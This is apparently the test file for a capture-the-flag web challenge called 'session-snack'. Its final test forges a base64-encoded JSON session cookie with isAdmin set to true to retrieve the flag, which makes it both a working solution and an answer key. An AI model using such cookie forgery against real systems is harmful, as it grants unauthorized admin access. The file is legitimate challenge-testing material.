import base64
from pathlib import Path
from urllib.parse import quote

from toolbox.utils.test_utils import RequestHelper, check_status_code, load_flag_hash, validate_flag_hash

request = RequestHelper(default_host="session-snack.hack4krak.pl")
task_path = Path(__file__).parent.parent


def test_non_admin_cannot_access_flag():
    response = request.get("/api/flag")
    check_status_code(response, 403)


def test_non_admin_cannot_access_flag_with_cookie():
    session = '{"username":"kanarzyca_halina","isAdmin":false}'
    encoded_session = quote(base64.b64encode(session.encode()).decode())
    cookies = {"session": encoded_session}
    response = request.get("/api/flag", cookies=cookies)
    check_status_code(response, 403)


def test_admin_can_access_flag():
    session = '{"username":"kanarzyca_halina","isAdmin":true}'
    encoded_session = quote(base64.b64encode(session.encode()).decode())
    cookies = {"session": encoded_session}
    response = request.get("/api/flag", cookies=cookies)
    check_status_code(response, 200)
    response = response.json()
    flag_content = response["flag"].split("{")[1].split("}")[0]

    flag_hash = load_flag_hash(task_path)
    assert flag_hash is not None
    assert validate_flag_hash(flag_content, flag_hash)
